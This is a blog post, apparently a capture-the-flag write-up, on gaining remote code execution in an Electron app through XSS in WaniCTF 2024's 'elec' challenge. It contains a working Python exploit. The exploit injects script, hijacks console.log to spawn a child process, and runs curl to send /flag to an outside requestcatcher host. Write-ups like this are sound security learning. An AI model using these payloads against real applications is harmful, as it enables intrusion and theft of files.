@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>elec - wanictf 2024 | shafouz blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="elec - wanictf 2024" />
+<meta name="author" content="shafouz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://ctftime.org/event/2377" />
+<meta property="og:description" content="https://ctftime.org/event/2377" />
+<link rel="canonical" href="https://shafouz.github.io/2024/06/23/elec.html" />
+<meta property="og:url" content="https://shafouz.github.io/2024/06/23/elec.html" />
+<meta property="og:site_name" content="shafouz blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-23T04:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="elec - wanictf 2024" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"shafouz"},"dateModified":"2024-06-23T04:00:00+00:00","datePublished":"2024-06-23T04:00:00+00:00","description":"https://ctftime.org/event/2377","headline":"elec - wanictf 2024","mainEntityOfPage":{"@type":"WebPage","@id":"https://shafouz.github.io/2024/06/23/elec.html"},"url":"https://shafouz.github.io/2024/06/23/elec.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://shafouz.github.io/feed.xml" title="shafouz blog" />
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-F6L4J94HSJ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-F6L4J94HSJ');
+  </script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">shafouz blog</a></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">elec - wanictf 2024</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-06-23T04:00:00+00:00" itemprop="datePublished">
+        Jun 23, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>https://ctftime.org/event/2377</p>
+
+<p>Could not solve during the ctf but was very close.</p>
+
+<h1 id="elec-web">elec (web)</h1>
+
+<p>This is a classic xss -&gt; report challenge but it uses a electron app instead of a puppeteer script.</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>The xss happens on <code class="language-plaintext highlighter-rouge">/article/:id</code> and there are some limits to it by the CSP</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Content</span><span class="o">-</span><span class="n">Security</span><span class="o">-</span><span class="n">Policy</span><span class="s">", "</span><span class="k">default</span><span class="o">-</span><span class="n">src</span> <span class="err">'</span><span class="n">self</span><span class="err">'</span><span class="p">;</span> <span class="n">script</span><span class="o">-</span><span class="n">src</span> <span class="err">'</span><span class="n">self</span><span class="err">'</span> <span class="n">https</span><span class="o">:</span><span class="c">//cdn.jsdelivr.net https://esm.sh 'unsafe-inline'; style-src 'self' https://cdn.jsdelivr.net; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"</span>
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">win</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BrowserWindow</span><span class="p">({</span>
+	<span class="na">width</span><span class="p">:</span> <span class="mi">800</span><span class="p">,</span>
+	<span class="na">height</span><span class="p">:</span> <span class="mi">600</span><span class="p">,</span>
+	<span class="na">webPreferences</span><span class="p">:</span> <span class="p">{</span>
+		<span class="na">preload</span><span class="p">:</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">"</span><span class="s2">preload.js</span><span class="dl">"</span><span class="p">),</span>
+		<span class="na">contextIsolation</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+		<span class="na">sandbox</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+	<span class="p">},</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>electron window options:</p>
+<ul>
+  <li>no nodeIntegration so we cant just do require(‘child_process’)</li>
+  <li>contextIsolation so if we set something in preload it will show in renderer</li>
+  <li>more details:
+    <ul>
+      <li>https://www.electronjs.org/docs/latest/</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+	<span class="kd">const</span> <span class="nx">versions</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="na">app</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0.0.1</span><span class="dl">"</span><span class="p">,</span>
+		<span class="na">node</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">versions</span><span class="p">.</span><span class="nx">node</span><span class="p">,</span>
+		<span class="na">chrome</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">versions</span><span class="p">.</span><span class="nx">chrome</span><span class="p">,</span>
+		<span class="na">electron</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">versions</span><span class="p">.</span><span class="nx">electron</span><span class="p">,</span>
+	<span class="p">};</span>
+	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">versions</span><span class="p">);</span>
+
+	<span class="kd">const</span> <span class="nx">cp</span> <span class="o">=</span> <span class="nx">spawn</span><span class="p">(</span><span class="dl">"</span><span class="s2">uname</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="dl">"</span><span class="s2">-a</span><span class="dl">"</span><span class="p">]);</span>
+	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">cp</span><span class="p">);</span>
+	<span class="kd">const</span> <span class="nx">kernelInfo</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">loadStream</span><span class="p">(</span><span class="nx">cp</span><span class="p">.</span><span class="nx">stdout</span><span class="p">);</span>
+
+	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">app-version</span><span class="dl">"</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">versions</span><span class="p">.</span><span class="nx">app</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">node-version</span><span class="dl">"</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">versions</span><span class="p">.</span><span class="nx">node</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">chrome-version</span><span class="dl">"</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">versions</span><span class="p">.</span><span class="nx">chrome</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">electron-version</span><span class="dl">"</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">versions</span><span class="p">.</span><span class="nx">electron</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">kernel-info</span><span class="dl">"</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">kernelInfo</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin-footer</span><span class="dl">"</span><span class="p">).</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="dl">"</span><span class="s2">d-none</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>this is the preload script, the main vulnerability in this is that stuff can be overwritten from the xss. so if we set <code class="language-plaintext highlighter-rouge">document.getElementById = alert</code> an alert will popup.
+there are 2 problems, the flag is in a file and <code class="language-plaintext highlighter-rouge">connect-src 'self'</code> so we need an rce.</p>
+
+<p>looking at interesting stuff to overwrite, we see <code class="language-plaintext highlighter-rouge">console.log</code> being called with an instance of <code class="language-plaintext highlighter-rouge">ChildProcess</code>
+so we overwrite that and call its constructor and just curl the flag</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://0.0.0.0:1323/"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"""
+&lt;script//type="module"&gt;
+var console = (function(oldCons){
+    return {
+        log: function(text){
+            if (text.spawnfile) {
+                const cp2 = new text.constructor();
+                cp2.spawn({ shell: true, file: 'curl', args: ['curl', '-F', 'flag=@/flag', 'https://lalalalalallalala.requestcatcher.com/'] });
+                return oldCons.log(text);
+            }
+
+            oldCons.log(text);
+        },
+    };
+}(window.console));
+
+window.parent.console = console;
+&lt;/script&gt;
+"""</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">"&amp;nbsp;"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"&lt;"</span><span class="p">,</span> <span class="s">"&amp;lt;"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="s">"&amp;gt;"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="n">body</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""&lt;img src=x onerror='javascript:a="</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">";document.getElementById("content").innerHTML="&lt;iframe srcdoc="+atob(a)+"&gt;&lt;/iframe&gt;"'&gt;"""</span>
+<span class="k">print</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+        <span class="s">'title'</span><span class="p">:</span><span class="n">body</span><span class="p">,</span>
+        <span class="s">'content'</span><span class="p">:</span><span class="n">body</span>
+    <span class="p">})</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'action="(.+?)"'</span><span class="p">,</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">REMOTE</span><span class="o">+</span><span class="n">url</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/report'</span><span class="p">,</span><span class="s">'article'</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"error"</span><span class="p">)</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="n">url</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">FLAG{r3m07e_c0d3_execu710n_v1a_3l3c7r0n}</code></p>
+
+<p>shafouz 2024/06/23</p>
+
+  </div><a class="u-url" href="/2024/06/23/elec.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://shafouz.github.io/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">shafouz</li>
+          <li><a class="u-email" href="mailto:jlmacedomatos@gmail.com">contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://hackerone.com/shafou" target="_blank" title="hackerone">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://github.com/shafouz" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/shafouzzzzzz" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/joao-luca/" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
